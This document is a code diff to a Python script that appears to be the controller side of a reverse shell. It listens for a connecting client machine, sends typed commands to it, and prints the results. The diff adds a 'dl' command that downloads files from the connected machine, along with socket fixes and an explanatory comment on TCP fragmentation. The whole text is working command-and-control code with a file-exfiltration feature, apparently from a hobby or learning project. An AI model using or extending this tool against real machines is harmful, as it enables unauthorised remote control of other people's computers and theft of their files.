@@ -26,13 +26,14 @@ def send_command_and_receive_all_data(socket_p, command):
     if not command:
         return None
     socket_p.sendall(command.encode())
-    header_data = socket_p.recv(13)
+    header_data = socket_receive_all_data(socket_p, 13)
     data_len = int(header_data.decode())
     data_received = socket_receive_all_data(socket_p, data_len)
     return data_received
 
 
 s = socket.socket()
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # restarts server instantly
 s.bind((HOST_IP, HOST_PORT))
 s.listen()
 
@@ -40,14 +41,39 @@ print(f"Listening for connection on {HOST_IP}, port {HOST_PORT}.......")
 connection_socket, client_address = s.accept()
 print(f"Connection established with {client_address}")
 s.close()
+
+dl_filename = None
 while True:
     client_machine_info = send_command_and_receive_all_data(connection_socket, "info")
     if not client_machine_info:
         break
     command = input(f"{client_machine_info.decode()} >  ")
+
+    command_split = command.split(' ')
+    if len(command_split) == 2 and command_split[0] == "dl":
+        dl_filename = command_split[1]
+
     data = send_command_and_receive_all_data(connection_socket, command)
     if not data:
         break
-    print(data.decode())
+
+    if dl_filename:
+        if len(data) == 1 and data == b" ":
+            print(f"The file '{command_split[1]}' does not exist")
+        else:
+            f = open(command_split[1], "wb")
+            f.write(data)
+            f.close()
+            print("File",dl_filename,"download")
+        dl_filename = None
+    else:
+        print(data.decode())
 
 connection_socket.close()
+
+"""
+The reason for the socket_receive_all_data() function: 
+In TCP networking, data can be fragmented. When you ask for 13 bytes, the network might only give you 5 bytes
+in the first "packet" and the other 8 bytes a millisecond later. So if you call the recv() function once you may collect
+incomplet data
+"""
